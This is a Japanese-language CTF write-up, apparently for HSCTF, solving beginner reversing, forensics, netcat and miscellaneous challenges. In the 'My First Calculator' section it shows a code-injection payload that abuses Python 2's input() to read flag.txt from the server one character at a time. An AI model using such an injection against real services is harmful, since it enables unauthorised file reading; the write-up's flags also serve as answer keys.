# Web以外

## Reverse Engineering

### AP Lab: Computer Science Principles

```txt
This activity will ask you to reverse a basic program and solve an introductory reversing challenge. You will be given an output that is to be used in order to reconstruct the input, which is the flag.

Note: The "Student Guide" isn't needed to solve the challenges in this series.

Author: AC
```

```java
// ComputerSciencePrinciples.java

import java.util.Scanner;
public class ComputerSciencePrinciples
{
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        String inp = sc.nextLine();
        if (inp.length()!=18) {
            System.out.println("Your input is incorrect.");
            System.exit(0);
        }
        inp=shift2(shift(inp));
        if (inp.equals("inagzgkpm)Wl&Tg&io")) {
            System.out.println("Correct. Your input is the flag.");
        }
        else {
            System.out.println("Your input is incorrect.");
        }
        System.out.println(inp);
    }
    public static String shift(String input) {
        String ret = "";
        for (int i = 0; i<input.length(); i++) {
            ret+=(char)(input.charAt(i)-i);
        }
        return ret;
    }
    public static String shift2(String input) {
        String ret = "";
        for (int i = 0; i<input.length(); i++) {
            ret+=(char)(input.charAt(i)+Integer.toString((int)input.charAt(i)).length());
        }
        return ret;
    }
}
```

shiftとshift2の足し算してるとこを引き算に書き換えて`inagzgkpm)Wl&Tg&io`を入力する

```txt
$ java ComputerSciencePrinciples.java
flag{intr0_t0_r3v}
```

## Forensics

### Comments

zipファイル

8重にzipされてるので展開していったら`flag.txt`があるが、中身は`No flag here. :(`。  
7zipで展開してるときに8つのファイルにコメントがついてることに気付いた。  

1.zip => f  
2.zip => l  
    :

と続いていって8文字のflagが手に入る。

```txt
flag{4n6}
```

### Meta Mountains

画像ファイルが渡される。stringsしたらflag。

```txt
$ strings mountains_hsctf.jpg
JFIF
Exif
Canon
part 1/3: flag{h1dd3n_w1th1n_
part 2/3: th3_m0unta1ns_
2012:02:03 11:18:05
part 3/3: l13s_th3_m3tadata}
```

```txt
flag{h1dd3n_w1th1n_th3_m0unta1ns_l13s_th3_m3tadata}
```

## Binary Exploitation

### Intro to Netcat 2: Electric Boogaloo

```txt
Intro to Netcat was too difficult, seeing as 32% of teams failed to solve it.

To get the flag, install Netcat.

nc pwn.hsctf.com 5001

Author: meow
```

ncしたら書いてあった。

```txt
> nc pwn.hsctf.com 5001
Hey, here's your flag! flag{https://youtu.be/-TVWst0YqCI}
```

## Miscellaneous

### Does CTFd Work

```txt
Does the Catch The Flag daemon work? Here's the flag: flag{y3S_i7_d03s_3xcl4m4710n_m4rk_890d9a0b}

If you are a student at WW-P, please have your team captain DM JC01010, AC, or PMP with:

All of your registered usernames
Your real names
All student emails (for identification)
Your team This information will be used to register your team on the WW-P leaderboard which you will have access to.
```

書いてある。

```txt
flag{y3S_i7_d03s_3xcl4m4710n_m4rk_890d9a0b}
```

### My First Calculator

```txt
I'm really new to python. Please don't break my calculator!

nc misc.hsctf.com 7001

There is a flag.txt on the server.

Author: meow
```

```python
# calculator.py

#!/usr/bin/env python2.7

try:
    print("Welcome to my calculator!")
    print("You can add, subtract, multiply and divide some numbers")

    print("")

    first = int(input("First number: "))
    second = int(input("Second number: "))

    operation = str(raw_input("Operation (+ - * /): "))

    if first != 1 or second != 1:
        print("")
        print("Sorry, only the number 1 is supported")

    if first == 1 and second == 1 and operation == "+":
        print("1 + 1 = 2")
    if first == 1 and second == 1 and operation == "-":
        print("1 - 1 = 0")
    if first == 1 and second == 1 and operation == "*":
        print("1 * 1 = 1")
    if first == 1 and second == 1 and operation == "/":
        print("1 / 1 = 1")
    else:
        print(first + second)
except ValueError:
    pass
```

```txt
$ nc misc.hsctf.com 7001
Welcome to my calculator!
You can add, subtract, multiply and divide some numbers

First number: 1
Second number: 1
Operation (+ - * /): +
1 + 1 = 2
2
```

数字を2個と演算子を指定したら計算するっぽいように見せておいて、数字は1しか対応してないし、演算子はif列挙。  
firstとsecondはintじゃないとエラー吐くっぽい。  
いろいろ適当に入力してたら`hoge`入力時に不自然なエラーメッセージを見つけた。

```txt
First number: hoge
Traceback (most recent call last):
  File "calculator.py", line 9, in <module>
    first = int(input("First number: "))
  File "<string>", line 1, in <module>
NameError: name 'hoge' is not defined
```

`not defined`...?ってことは入力した`hoge`が変数として扱われてるのだろうか。  
firstに`1`、secondに`first`、演算子に`+`を入力してみる。

```txt
First number: 1
Second number: first
Operation (+ - * /): +
1 + 1 = 2
2
```

ビンゴ。あとはやるだけ。

```txt
Welcome to my calculator!
You can add, subtract, multiply and divide some numbers

First number: ord(open("flag.txt").read()[0:1])
Second number: 0
Operation (+ - * /): hoge

Sorry, only the number 1 is supported
102
```

これでflag.txtの1文字目がわかる。102は**f**。  
`[1:2]`,`[2:3]`と1文字ずつやった。  
python詳しくないのでもっといい方法有るかもしれない。というかあって欲しい。

```txt
flag{please_use_python3}
```
